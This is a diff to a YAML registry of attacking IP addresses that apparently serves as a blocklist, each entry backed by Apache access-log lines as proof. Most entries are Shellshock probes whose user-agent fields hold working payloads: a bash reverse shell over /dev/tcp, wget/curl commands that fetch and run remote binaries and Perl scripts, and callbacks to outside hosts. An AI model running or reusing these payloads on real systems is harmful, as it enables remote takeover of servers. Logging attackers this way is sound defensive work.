@@ -1,6 +1,6 @@
 ips:
   '129.121.182.100':
-    categories: ['exploitfinder.shellshock', 'attacks.80']
+    categories: ['exploit_finder.shellshock', 'attacks.80']
     proof:
       type: "apache2_access_log"
       contents: [ # DON'T RUN THESE COMMANDS.
@@ -20,3 +20,60 @@ ips:
           "104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] \"GET /user HTTP/1.0\" 404 1013 \"-\" \"-\""
           "104.236.255.234 - - [04/Mar/2015:10:10:34 +0000] \"GET /admin.php HTTP/1.0\" 503 1020 \"-\" \"-\""
       ]
+  '67.20.55.61':
+    categories: ['sensitive_information_finder', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [
+        "67.20.55.61 - - [29/Jun/2014:15:24:40 +0000] \"HEAD /.bash_history HTTP/1.1\" 404 0 \"-\" \"-\""
+      ]
+  '207.240.10.33':
+    categories: ['exploit_finder.shellshock', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [
+          "207.240.10.33 - - [29/Oct/2014:21:52:08 +0000] \"GET /cgi-sys/defaultwebpage.cgi HTTP/1.0\" 404 162 \"-\" \"() { ignored;};/bin/bash -i >& /dev/tcp/207.240.10.1/8888 0>&1\""
+        ]
+  '77.68.40.82':
+    categories: ['exploit_finder.shellshock', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [ # DO NOT RUN THESE COMMANDS
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/php.fcgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/test.sh HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/proxy.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/uptime.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/index.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/print.sh HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/login.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-sys/guestbook.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-sys/defaultwebpage.cgi HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        "77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] \"GET /cgi-bin/info.sh HTTP/1.0\" 404 162 \"-\" \"() { :;}; /bin/bash -c \x22wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*\x22\""
+        ]
+  '176.102.48.36':
+    categories: ['exploit_finder.shellshock', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [ # DO NOT RUN THESE COMMANDS
+        "176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/'\""
+        "176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] \"HEAD /cgi-sys/entropysearch.cgi HTTP/1.1\" 404 0 \"-\" \"() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/cgi-sys/entropysearch.cgi'\""
+        "176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] \"HEAD /cgi-bin/ HTTP/1.1\" 404 0 \"-\" \"() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/cgi-bin/'\""
+      ]
+  '61.182.202.57':
+    categories: ['exploit_finder.shellshock', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [ # DO NOT RUN THESE COMMANDS
+        "61.182.202.57 - - [16/Dec/2014:18:09:42 +0000] \"GET /cgi-bin/bash HTTP/1.1\" 404 162 \"-\" \"() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://210.230.186.9/icons/guide/jp.pl -O /tmp/jp.pl;curl -O /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;fetch /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;perl /tmp/jp.pl;rm -rf /tmp/jp.pl*\x22);'\""
+      ]
+  '129.121.182.100':
+    categories: ['exploit_finder.shellshock', 'attacks.80']
+    proof:
+      type: "apache2_access_log"
+      contents: [ # DO NOT RUN THESE COMMANDS
+        "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /cgi-bin/php5-cli? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80\x22\""
+        "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /cgi-bin/php? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php? > /dev/udp/213.233.161.42/80\x22\""
+        "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /cgi-bin/php5? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php5? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php5? > /dev/udp/213.233.161.42/80\x22\""
+        "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /phppath/cgi_wrapper? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\x22\""
+        "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /phppath/php? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/php? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/php? > /dev/udp/213.233.161.42/80\x22\""
+  ]
